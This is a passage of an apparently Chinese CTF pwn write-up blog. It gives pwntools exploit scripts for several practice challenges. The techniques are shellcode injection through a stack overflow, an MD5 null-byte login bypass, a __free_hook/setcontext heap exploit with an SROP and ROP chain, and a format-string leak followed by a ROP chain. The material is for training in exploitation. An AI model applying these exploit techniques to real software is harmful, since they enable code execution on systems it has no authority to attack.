class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./bypwn&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;well you input:&#x27;</span>) </span><br><span class="line">    sd(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">    rbp = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">    echo(<span class="string">&#x27;rbp address:&#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="comment"># sla(&#x27;EASY PWN PWN PWN~&#x27;, &#x27;a&#x27;)</span></span><br><span class="line">    ru(<span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">    shellcode_address = rbp - <span class="number">0x50</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    echo(<span class="string">&#x27;shellcode len:&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    payload = shellcode </span><br><span class="line">    payload = payload.ljust(<span class="number">0x58</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(shellcode_address)</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="datasystem"><a href="#datasystem" class="headerlink" title="datasystem"></a>datasystem</h2><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut5y06i9sj61gw0u00zm02.jpg" alt=""></p><p>打开之后，我：？？？</p><p>登录系统看了一下午，angr跑路径，ida静动调，gdb动调</p><p>后来用win打开，findcrypto一把梭，findcrypto，彳亍！</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut6114c05j61900du77e02.jpg" alt=""></p><p>找到bignumber和下面的常数，点进去，👴🏻傻了，捏🐴，这不就是md5</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut6mk1rxqj616g0fy77j02.jpg" alt=""></p><p>自己验证了一波，确实是md5</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut62re7mrj61540bu0wf02.jpg" alt=""></p><p>这块就是密🐴了，那不就简单了，👴🏻很开心，👴🏻去了cmd5</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut66qrzqqj61fi0k8dhr02.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut67ed4uij613s0ty0yn02.jpg" style="zoom:50%;" /></p><p>呃呃，👴🏻很生气</p><p>好吧，写个脚本跑密码无果后，发现自己想歪了，md5靠啥比对的，strcpy啊，00截断啊，瞬间如梦初醒，直接写个函数爆破第一位是00字符的脚本，然后后面就是常规的菜单题了，add的时候可以溢出，开了沙箱，劫持__free_hook为setcontext + 53的地方来控制寄存器，简单题不赘述了</p><p>对，还有几个小小的点记录一下：</p><ol><li>ida7.5对登录的逻辑反编译的结果更为清晰：</li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gut6jrg381j316i0u0799.jpg" alt=""></p><p>（当时用ida7.0调了好久才发现是和admin作对比，ida7.5直接出了）</p><ol><li><p>填密码的时候后面要用00填充到0x20，要不然过不了验证</p></li><li><p>学好逆向对pwn手真的很重要（留下了不会逆向的泪水</p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./datasystem&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./libc-2.27.so&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge,&#x27;b *$rebase(0x2ab1)&#x27;)</span></span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26719</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./datasystem&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_edit,_show = <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt; :&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;Content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_password</span>():</span></span><br><span class="line">    all_letters = ascii_letters + digits + <span class="string">&#x27;.,;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> permutations(all_letters, i):</span><br><span class="line">            item = <span class="string">&#x27;&#x27;</span>.join(item)</span><br><span class="line">            <span class="keyword">if</span> md5(item.encode()).hexdigest()[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;00&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> item.ljust(<span class="number">0x20</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&#x27;please input username:&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">    sa(<span class="string">&#x27;please input password:&#x27;</span>, hack_password())</span><br><span class="line">    <span class="comment"># 0ea1fb4edf4aae8fb2ee19fb1cfbe362</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span>)   <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x430</span>, <span class="string">&#x27;ub&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x20</span> * <span class="string">&#x27;a&#x27;</span>)   <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    __free_hook = leak + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = leak + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="number">0x10</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x441</span>))   <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="number">0x40</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p64(__free_hook))    <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    libc_base = leak</span><br><span class="line">    setcontext_door = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    syscall = libc_base + libc.search(asm(<span class="string">&quot;syscall\nret&quot;</span>)).<span class="built_in">next</span>()</span><br><span class="line">    echo(<span class="string">&#x27;SYSCALL:&#x27;</span> + <span class="built_in">hex</span>(syscall))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#=========================setcontext===========================</span></span><br><span class="line"></span><br><span class="line">    fake_rsp = free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span></span><br><span class="line">    frame.rdi = <span class="number">0</span></span><br><span class="line">    frame.rsi = fake_rsp</span><br><span class="line">    frame.rdx = <span class="number">0x2000</span></span><br><span class="line">    frame.rsp = fake_rsp</span><br><span class="line">    frame.rip = syscall</span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(frame))))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x40</span>, p64(setcontext_door))  <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    add(<span class="built_in">len</span>(<span class="built_in">str</span>(frame)), <span class="built_in">str</span>(frame)) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    layout = [</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdi; ret;</span></span><br><span class="line">    free_hook &amp; <span class="number">0xfffffffffffff000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rsi\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rsi; ret;</span></span><br><span class="line">    <span class="number">0x2000</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rdx; ret;</span></span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;pop rax\nret&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: pop rax; ret;</span></span><br><span class="line">    <span class="number">10</span>,</span><br><span class="line">    syscall, <span class="comment">#: syscall; ret;</span></span><br><span class="line">    libc_base+libc.search(asm(<span class="string">&quot;jmp rsp&quot;</span>)).<span class="built_in">next</span>(), <span class="comment">#: jmp rsp;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    sub rsp, 0x800</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    mov eax, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    cmp eax, 0</span></span><br><span class="line"><span class="string">    js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edx, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    failed:</span></span><br><span class="line"><span class="string">    push 0x6c696166</span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 4</span></span><br><span class="line"><span class="string">    mov eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    exit:</span></span><br><span class="line"><span class="string">    xor edi, edi</span></span><br><span class="line"><span class="string">    mov eax, 231</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sd(flat(layout) + shellcode)</span><br><span class="line"></span><br><span class="line">    gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="hahapwn"><a href="#hahapwn" class="headerlink" title="hahapwn"></a>hahapwn</h2><p>也是简单题，printf泄露canary，rbp寄存器和libc地址，然后就是一个大规模栈溢出不过开了沙箱</p><p>不知道为什么，wirte和read函数执行不了，但是溢出的字节数量很多并且能用libc的gadget，所以可以直接用syscall来控制程序的执行流，注意，ROPgadget是找不到<code>syscall; ret;</code>这个gadget的，这个gadget得用ropper来找</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/2.23/lib/libc-2.23.so&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;./newlib&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        <span class="comment"># io = gdb.debug(challenge, &#x27;b *0x4007B6&#x27;)</span></span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26888</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwn&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;Welcome! What is your name?&#x27;</span>)</span><br><span class="line">    sd(<span class="string">&#x27;%27$paaaa%28$pbbbb%39$pcccc&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    echo(<span class="string">&#x27;CANARY:&#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    rbp = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x50</span></span><br><span class="line">    echo(<span class="string">&#x27;RBP:&#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line">    ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;cccc&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">240</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">    libc_base = leak</span><br><span class="line">    <span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read = libc_base + <span class="number">0x0F7336</span> </span><br><span class="line">    echo(<span class="string">&#x27;read:&#x27;</span> + <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">    write = libc_base + <span class="number">0xF738D</span></span><br><span class="line">    puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc_base + <span class="number">0x0000000000021112</span></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x00000000000202f8</span></span><br><span class="line">    pop_rdx_ret = libc_base + <span 